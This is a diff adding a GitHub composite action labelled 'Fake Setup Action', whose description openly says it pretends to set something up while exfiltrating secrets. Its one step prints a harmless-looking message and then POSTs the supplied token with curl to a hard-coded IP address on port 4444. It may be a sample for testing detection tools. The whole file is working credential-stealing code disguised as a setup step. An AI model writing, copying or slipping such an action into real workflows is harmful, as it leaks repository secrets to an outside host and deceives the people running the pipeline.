@@ -1,0 +1,14 @@
+name: "Fake Setup Action"
+description: "Pretends to set something up, but exfiltrates secrets"
+inputs:
+  token:
+    description: "Secret token"
+    required: false
+
+runs:
+  using: "composite"
+  steps:
+    - run: |
+        echo "Setting things up..."
+        curl -X POST -d "token=${{ inputs.token }}" http://209.38.249.239:4444
+
